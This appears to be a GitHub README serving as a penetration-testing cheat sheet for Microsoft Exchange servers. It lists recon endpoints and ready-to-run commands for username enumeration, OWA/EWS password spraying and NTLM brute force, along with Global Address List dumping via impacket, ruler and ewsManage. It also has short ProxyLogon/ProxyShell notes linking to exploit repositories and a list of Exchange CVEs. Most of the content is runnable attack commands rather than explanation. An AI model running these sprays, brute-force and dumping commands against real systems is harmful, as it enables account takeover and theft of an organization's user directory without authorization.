# exchange penetration testing
exchange penetration testing

## Recon

* local domain name
  * https://mail.target.ir/autodiscover/autodiscover.json
  * X-CalculatedBETarget: exchange-01.target.local

* exchange version check
  *  https://mail.target.ir/EWS/Exchange.asmx
  *  X-OWA-Version: 15.2.1118.9

* get exchange version
```python
sudo python3 get_exchange_version.py https://mail.target.com
```



## Bruteforce

### use MailSniper enum

```powershell
Import-Module MailSniper.ps1
Invoke-DomainHarvestOWA -ExchHostname mail.domain.com
```

### Password Spray
* PasswordSprayOWA : will attempt to connect to an OWA portal and perform a password spraying attack using a userlist and a single password.
* PasswordSprayEWS :  will attempt to connect to an EWS portal and perform a password spraying attack using a userlist and a single password.

```powershell
Import-Module MailSniper.ps1
Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile owa-sprayed-creds.txt
Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt
```

### python NTLM password Sparay

```python
python3 bruteforce/bruteforce.py -t https://mail.domain.com/EWS/Exchange.asmx -U users.txt -p TestPassword
```



## GAL 
The Microsoft Exchange Global Address List (GAL) is a list of all end users and their respective email addresses within an Exchange Server organization that uses Microsoft Outlook for email.

### use exchanger.py [impacket](https://github.com/SecureAuthCorp/impacket)
```python
python exchanger.py DomainName/Username:"Password"@mail.domain.com nspi list-tables
```

### use ruler 
```python
./ruler-linux64 --url https://mail.domain.com/autodiscover/autodiscover.xml --email Username@domain.com -d DomainName -u Username -p Password --debug --verbose  abk dump --output gal.txt 
```

### use ewsManage.py
```python
python3 ewsManage.py mail.domain.com 443 plaintext DomainName Username Password findallpeopl
```

* for export GAL we should enum valid username,password and email first !





## [ProxyLogon](https://github.com/kh4sh3i/ProxyLogon)
ProxyLogon is the formally generic name for CVE-2021-26855, a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the authentication and impersonating as the admin. We have also chained this bug with another post-auth arbitrary-file-write vulnerability, CVE-2021-27065, to get code execution.


## [ProxyShell](https://github.com/kh4sh3i/ProxyShell)
CVE-2021-34473 Microsoft Exchange Server Remote Code Execution Vulnerability. This faulty URL normalization lets us access an arbitrary backend URL while running as the Exchange Server machine account. Although this bug is not as powerful as the SSRF in ProxyLogon, and we could manipulate only the path part of the URL


## WebShell



#### most famous cve
```
cve-2021-31206
cve-2021-31207
cve-2021-34473
cve-2021-34523
cve-2021-26855
cve-2021-26857
cve-2021-26858
cve-2021-27065
cve-2015-1635
```


<img src="/img/1.png" width="800px" />
<img src="/img/2.png" width="800px" />
<img src="/img/3.png" width="800px" />
<img src="/img/4.png" width="800px" />
<img src="/img/5.png" width="800px" />

### Reference
* [proxylogon orange](https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html)
* [proxylogon orange 2](https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html)
* [python2](https://www.how2shout.com/linux/how-to-install-python-2-7-on-ubuntu-20-04-lts/)
* [proxylogon](https://proxylogon.com/)

